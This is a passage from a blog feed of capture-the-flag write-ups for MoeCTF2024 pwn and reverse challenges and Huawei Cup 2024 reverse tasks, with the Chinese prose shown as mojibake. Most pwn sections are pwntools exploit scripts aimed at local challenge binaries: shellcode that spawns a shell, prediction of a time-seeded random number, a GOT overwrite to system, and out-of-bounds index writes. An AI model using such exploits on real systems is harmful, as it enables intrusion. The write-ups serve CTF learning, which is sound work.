title="preshellcode"></a>preshellcode</h2><p>è°ƒç”¨ç³»ç»Ÿå‡½æ•°getshell</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724290549088-05b11161-b092-46c9-83cf-2dd68ceca901.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./preshellcode&#x27;</span><br>elf = ELF(filename)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">36321</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>payload=asm(shellcraft.sh())<br>sla(<span class="hljs-string">&#x27;Give me your code, and I will execute it.&#x27;</span>,payload)<br><br>inter()<br></code></pre></td></tr></table></figure><h2 id="prerandom"><a href="#prerandom" class="headerlink" title="prerandom"></a>prerandom</h2><p>ç¬¬ä¸€æ¬¡éšæœºå¯ä»¥é¢„æµ‹ä¸”å¿…é¡»æ­£ç¡®</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724308251808-36acb53a-3495-4c9a-ac1b-6ef06228eec7.png" class="" title="img"><p>ç”¨cè·‘å‡ºéšæœºæ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">local_time</span>;</span><br>    <span class="hljs-type">time_t</span> timer;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> secret;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> guess;<br><br>    timer = time(<span class="hljs-number">0</span>);<br>    local_time = localtime(&amp;timer);<br><br>    srandom(local_time);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br><br>        secret = random() % <span class="hljs-number">90000</span> + <span class="hljs-number">10000</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u,&quot;</span>, secret);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>from pwn import *<br>from <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">import</span> <span class="hljs-title">pack</span></span><br><span class="hljs-class"><span class="hljs-title">import</span> <span class="hljs-title">random</span></span><br><span class="hljs-class"><span class="hljs-title">import</span> <span class="hljs-title">time</span></span><br><span class="hljs-class">#<span class="hljs-title">from</span> <span class="hljs-title">LibcSearcher</span> <span class="hljs-title">import</span> *</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">filename</span>=</span><span class="hljs-string">&#x27;./prerandom&#x27;</span><br><span class="hljs-meta">#elf = ELF(filename)</span><br><span class="hljs-meta">#libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33481</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br>current_time = <span class="hljs-type">int</span>(time.time())<br><br><br>local_time = time.localtime(current_time)<br>tm_yday = local_time.tm_yday<br>print(<span class="hljs-string">&#x27;tm_yday=&#x27;</span>,tm_yday)<br><br>random.seed(<span class="hljs-number">0x1c</span>)<br><br><br>def s(a) : io.send(a)<br>def sa(a, b) : io.sendafter(a, b)<br>def sl(a) : io.sendline(a)<br>def sla(a, b) : io.sendlineafter(a, b)<br>def r() : <span class="hljs-keyword">return</span> io.recv()<br>def pr() : print(io.recv())<br>def ru(a) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br>def inter() : io.interactive()<br>def gdb():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br>def get_addr():<br><span class="hljs-meta">#return u64(io.recvuntil(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>a=[<span class="hljs-number">42939</span>,<span class="hljs-number">82233</span>,<span class="hljs-number">11977</span>,<span class="hljs-number">49364</span>,<span class="hljs-number">43107</span>,<span class="hljs-number">26433</span>,<span class="hljs-number">12595</span>,<span class="hljs-number">26204</span>,<span class="hljs-number">20274</span>,<span class="hljs-number">26550</span>]<br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br><span class="hljs-meta">#secret = random.randint(10000,100000)</span><br><span class="hljs-meta">#print(<span class="hljs-string">&#x27;secret=&#x27;</span>,secret)</span><br>sla(<span class="hljs-string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>,str(a[i]))<br><br><br>sla(<span class="hljs-string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>inter()<br></code></pre></td></tr></table></figure><h2 id="flag-helper"><a href="#flag-helper" class="headerlink" title="flag_helper"></a>flag_helper</h2><p>ä¸èƒ½ç›´æ¥è¯»flagï¼Œopenéœ€è¦æœ‰å‚æ•°flags</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723464821414-4d2f325a-c38d-4865-8d9b-9589a60a840b.png" class="" title="img"><p>éœ€è¦mmapå¼€è¾Ÿç©ºé—´</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465094787-80ce1c5a-4cd8-40f5-967e-b2f999556058.png" class="" title="img"><p>éœ€è¦mmap</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465110295-856994d2-cc1a-4a01-ba87-652deeaea894.png" class="" title="img"><p>ç­‰ä»·äºä¸¤æ¡å‘½ä»¤open(â€˜&#x2F;flagâ€™,0);mmap(7,34)ï¼ˆéƒ¨åˆ†å‚æ•°é¢˜ç›®æ²¡é—®å°±çœç•¥äº†ï¼Œ7ä»£è¡¨rwxï¼Œ34æ˜¯å¸¸è§çš„flagså€¼ï¼‰ï¼Œfd012åˆ†åˆ«è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼Œè¾“å‡ºï¼Œé”™è¯¯ï¼ŒåŠ ä¸Šflagå‰é¢opençš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥fdä¸º5</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465443987-dbe8d25a-9831-4b8f-8d5d-ab5782a5cfe6.png" class="" title="img"><h2 id="pregot-1"><a href="#pregot-1" class="headerlink" title="pregot-1"></a>pregot-1</h2><p>gotè¡¨å¯å†™</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727671790676-7b01f6af-ee3f-4d0b-b940-268858a41f5c.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1725765690130-cc3530a1-a25e-4dc7-a068-0fd65d5198b9.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1725765705563-5150f599-e587-464f-b35f-5aedc6999025.png" class="" title="img"><p>è¿™é‡Œä¸èƒ½ç›´æ¥è°ƒç”¨pltè¡¨ï¼Œè€Œæ˜¯å†™0x401056</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727671828625-3f15e4d3-83aa-48e8-a4be-21e176fa9e93.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pregot&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33953</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb1</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br><span class="hljs-comment">#system_addr=elf.plt[&#x27;system&#x27;]</span><br>system_addr=<span class="hljs-number">0x401056</span><br><span class="hljs-comment">#print(&#x27;sys:&#x27;,hex(system_addr))</span><br>unreachable_addr=<span class="hljs-number">0x401196</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(system_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(unreachable_addr)<br>s(payload)<br>inter()<br></code></pre></td></tr></table></figure><p>ç»™çš„æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œç›´æ¥ç©è‚¯å®šç©ä¸å‡ºæ¥ï¼Œçœ‹åˆ°æ•°ç»„æƒ³åˆ°ä¸‹æ ‡è¶Šç•Œ</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723540870980-9f33a9a2-4215-4363-9bb5-b5dea8b74912.png" class="" title="img"><p>è¿˜èƒ½ä¿®æ”¹å…¶å®å°±æ˜¯ä»»æ„åœ°å€æ”¹å†™ï¼Œç›´æ¥æŠŠè·ç¦»æ”¹å¤§ä¼šå‘Šè¯‰æˆ‘ä¸è¿‡ï¼Œåé¢è€ƒè™‘æ”¹é€Ÿåº¦ï¼Œé€Ÿåº¦å¤§ä¸€ç‚¹å¥½åƒæ²¡äº‹ï¼Œä¸ç”¨è·ç¦»åˆšåˆšå¥½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br><span class="hljs-comment">#filename=&#x27;./lockedshell&#x27;</span><br><span class="hljs-comment">#elf = ELF(filename)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33241</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Which engine?\n&#x27;</span>,<span class="hljs-string">&#x27;-16&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Thrust in percentage (0 ~ 100).\n&#x27;</span>,<span class="hljs-string">&#x27;32&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Which engine?\n&#x27;</span>,<span class="hljs-string">&#x27;-15&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Thrust in percentage (0 ~ 100).\n&#x27;</span>,<span class="hljs-string">&#x27;16&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Which engine?\n&#x27;</span>,<span class="hljs-string">&#x27;-5&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Thrust in percentage (0 ~ 100).\n&#x27;</span>,<span class="hljs-string">&#x27;50&#x27;</span>)<br><br><br>inter()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>z3</tag>
      
      <tag>teaé­”æ”¹</tag>
      
      <tag>RSA</tag>
      
      <tag>cython</tag>
      
      <tag>æ ˆè¿ç§»</tag>
      
      <tag>sm4</tag>
      
      <tag>shellcode</tag>
      
      <tag>è¿·å®«</tag>
      
      <tag>åè°ƒè¯•</tag>
      
      <tag>eè¯­è¨€</tag>
      
      <tag>çˆ†ç ´flag</tag>
      
      <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²</tag>
      
      <tag>SROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åä¸ºæ¯2024éƒ¨åˆ†é€†å‘wp</title>
    <link href="/2024/10/10/%E5%8D%8E%E4%B8%BA%E6%9D%AF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91wp/"/>
    <url>/2024/10/10/%E5%8D%8E%E4%B8%BA%E6%9D%AF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="BlackJack"><a href="#BlackJack" class="headerlink" title="BlackJack"></a>BlackJack</h2><p>æ¸¸æˆæˆåŠŸä¹‹åèƒ½è¾“å‡ºflagï¼Œç›´æ¥åŠ¨è°ƒç»•è¿‡</p><p>æ”¹æ±‡ç¼–æŒ‡ä»¤jleå˜æˆjbeï¼Œä¸Šé¢æ˜¯å¦æˆåŠŸçš„åˆ¤æ–­ä¿®æ”¹ZFç»•è¿‡</p><img src="/2024/10/10/%E5%8D%8E%E4%B8%BA%E6%9D%AF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91wp/1728444222280-faf02792-0c3b-465c-9f79-72ecf408a744.png" class="" title="img"><p>ä¸€è½®ç›´æ¥å‡ºæ¥ï¼Œå¾—åˆ°flag</p><img src="/2024/10/10/%E5%8D%8E%E4%B8%BA%E6%9D%AF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91wp/1728444164288-7e0bac04-a203-4a83-8017-6d5a06d06451.png" class="" title="img"><h2 id="ezhtml-1"><a href="#ezhtml-1" class="headerlink" title="ezhtml-1"></a>ezhtml-1</h2><p>wasmå¾—åˆ°.oæ–‡ä»¶ï¼Œå‘ç°å…³é”®å­—ç¬¦ä¸²ä½†æ˜¯æ²¡æ³•äº¤å‰å¼•ç”¨</p><img src="/2024/10/10/%E5%8D%8E%E4%B8%BA%E6%9D%AF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91wp/1728450652799-b3a17203-b23f-4e6b-912b-759a03b852c0.png" class="" title="img"><p>a[(i+1)%35]-&gt;&amp;0xf-&gt;^a[i]-&gt;&#x3D;a[i]æœ‰æ—¶å€™reé€»è¾‘ä¹Ÿèƒ½çŒœå‡ºæ¥ä½†éœ€è¦ä¸æ–­å°è¯•<img src="/2024/10/10/%E5%8D%8E%E4%B8%BA%E6%9D%AF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91wp/1728471113636-6a111dca-fce7-4cee-93c2-708e05a69682.png" class="" title="img"></p><p>çœ‹åˆ°å¸ˆå‚…ç”¨jebç›´æ¥åç¼–è¯‘wasm</p><img src="/2024/10/10/%E5%8D%8E%E4%B8%BA%E6%9D%AF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91wp/1729651660245-28548a94-86e4-46f8-897e-9b069aa9fdbf.png" class="" title="img"><p>ç‚¹å‡»mainï¼Œå‘ç°è°ƒç”¨äº†f7<img src="/2024/10/10/%E5%8D%8E%E4%B8%BA%E6%9D%AF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91wp/1729651688034-4f3c483c-454a-436c-91bb-4d2902dabd0a.png" class="" title="img"></p><p>å³é”®åç¼–è¯‘ï¼Œå‘ç°a[i]^&#x3D;a[(i+1)&amp;35]&amp;0xf</p><img src="/2024/10/10/%E5%8D%8E%E4%B8%BA%E6%9D%AF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91wp/1729651730148-c560ba14-07a5-4deb-a57b-e6ecbfb470d0.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;EBPGRM|VE9B]Q5Sb4vJ^2|ZoU[t?SiDf9Cx&#x27;</span><br>a=<span class="hljs-built_in">list</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    a[i]=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a[i]) ^ (<span class="hljs-built_in">ord</span>(a[(i + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(a)]) &amp; <span class="hljs-number">0xf</span>))<br>flag=<span class="hljs-string">&#x27;&#x27;</span>.join(a)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wasmé€†å‘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é…ç½®Rustç¯å¢ƒ</title>
    <link href="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/"/>
    <url>/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415384519-dc0a7f0b-c7f0-4379-8558-b49fe6933570.png" class="" title="img"><p>å®‰è£…rust</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1726708340945-2b3a275c-6ab9-40d1-8aee-f8f92ff29407.png" class="" title="img"><p>è¦å®‰è£…rs-dml</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415444700-6bf469ce-7b26-4297-b032-8de9a45d4481.png" class="" title="img"><p>ç‚¹è¿›rs-dmlï¼Œå‘ç°è¦å…ˆbuild</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415700117-c58d91ce-3cd7-40a3-bb2c-2a5d497e527c.png" class="" title="img"><p>build</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415430313-ffd6e315-c182-4e5b-8d10-a1e37845db07.png" class="" title="img"><p>æŠŠæ’ä»¶ä¸­çš„IDARustDemangler.pyæ”¾åˆ°pluginsç›®å½•</p><img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415797028-4b99536d-7d36-40fc-97af-55dbb6814c38.png" class="" title="img"><p>æ‰“å¼€å‘ç°æ²¡æœ‰è¯†åˆ«åˆ°<img src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415885331-e9ed7bcf-2e25-4bac-ae99-a151f87acfa3.png" class="" title="img"></p><p>è¦å»é…ç³»ç»Ÿå˜é‡çš„pathï¼ŒæŠŠreleaseæ–‡ä»¶æ”¾åˆ°pathä¸­</p><img 